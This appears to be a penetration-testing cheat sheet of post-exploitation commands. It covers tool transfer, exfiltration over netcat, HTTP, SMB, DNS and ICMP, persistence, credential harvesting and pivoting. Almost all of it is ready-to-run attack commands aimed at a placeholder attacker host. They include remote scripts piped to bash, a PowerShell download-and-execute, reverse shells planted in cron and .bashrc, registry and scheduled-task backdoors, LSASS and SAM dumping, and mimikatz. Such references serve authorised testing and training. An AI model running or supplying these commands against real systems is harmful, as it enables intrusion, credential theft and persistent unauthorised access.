# Post-Exploitation - Data Exfiltration

# ============================================
# FILE TRANSFER - ATTACKER → TARGET
# ============================================

# Python HTTP server (attacker)
python3 -m http.server 8000
python -m SimpleHTTPServer 8000

# Download on target (Linux)
wget http://ATTACKER:8000/file
curl http://ATTACKER:8000/file -o file
curl http://ATTACKER:8000/linpeas.sh | bash

# Download on target (Windows)
certutil -urlcache -split -f http://ATTACKER:8000/file file.exe
powershell -c "(New-Object Net.WebClient).DownloadFile('http://ATTACKER:8000/file','C:\temp\file')"
powershell -c "Invoke-WebRequest -Uri 'http://ATTACKER:8000/file' -OutFile 'C:\temp\file'"
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER:8000/script.ps1')"

# ============================================
# FILE TRANSFER - TARGET → ATTACKER
# ============================================

# Netcat
# Attacker:
nc -lvnp 4444 > file
# Target:
nc ATTACKER 4444 < file

# Base64 (small files)
# Target:
base64 file
# Copy output, then on attacker:
echo "BASE64STRING" | base64 -d > file

# HTTP POST
# Attacker:
python3 -c "from http.server import *; HTTPServer(('0.0.0.0',8000),SimpleHTTPRequestHandler).serve_forever()"
# Target:
curl -X POST -d @file http://ATTACKER:8000/

# SCP (if SSH available)
scp file user@ATTACKER:/tmp/

# ============================================
# SMB (Windows)
# ============================================

# Attacker (start SMB server)
impacket-smbserver share $(pwd) -smb2support
impacket-smbserver share $(pwd) -smb2support -user test -password test

# Target (Windows)
copy file \\ATTACKER\share\
copy \\ATTACKER\share\file .

# ============================================
# DNS EXFILTRATION
# ============================================

# Small data via DNS queries
cat /etc/passwd | base64 | tr -d '\n' | fold -w 63 | while read line; do nslookup $line.attacker.com; done

# ============================================
# ICMP EXFILTRATION
# ============================================

# Using ping
xxd -p -c 4 file | while read line; do ping -c 1 -p $line ATTACKER; done

# ============================================
# PERSISTENCE - LINUX
# ============================================

# SSH key
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys

# Cron
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'" | crontab -

# bashrc
echo "bash -i >& /dev/tcp/ATTACKER/4444 0>&1" >> ~/.bashrc

# ============================================
# PERSISTENCE - WINDOWS
# ============================================

# Registry Run key
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\temp\shell.exe"

# Scheduled task
schtasks /create /tn "Backdoor" /tr "C:\temp\shell.exe" /sc onlogon

# ============================================
# CREDENTIAL HARVESTING - LINUX
# ============================================

# Shadow file
cat /etc/shadow

# SSH keys
find / -name "id_rsa" 2>/dev/null

# History
cat ~/.bash_history
cat /home/*/.bash_history

# Memory dump
strings /dev/mem | grep -i password

# ============================================
# CREDENTIAL HARVESTING - WINDOWS
# ============================================

# SAM & SYSTEM
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
# Then use secretsdump.py

# Mimikatz
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# LSASS dump
procdump.exe -ma lsass.exe lsass.dmp
# Then mimikatz: sekurlsa::minidump lsass.dmp

# ============================================
# PIVOTING
# ============================================

# SSH port forwarding
ssh -L 8080:internal:80 user@jumphost   # Local forward
ssh -R 8080:localhost:80 user@attacker  # Remote forward
ssh -D 9050 user@jumphost               # Dynamic (SOCKS proxy)

# Chisel
# Attacker:
chisel server -p 8000 --reverse
# Target:
chisel client ATTACKER:8000 R:8080:127.0.0.1:80

# Ligolo-ng
# Modern pivoting tool

# Proxychains
# Configure /etc/proxychains.conf then:
proxychains nmap -sT internal_ip
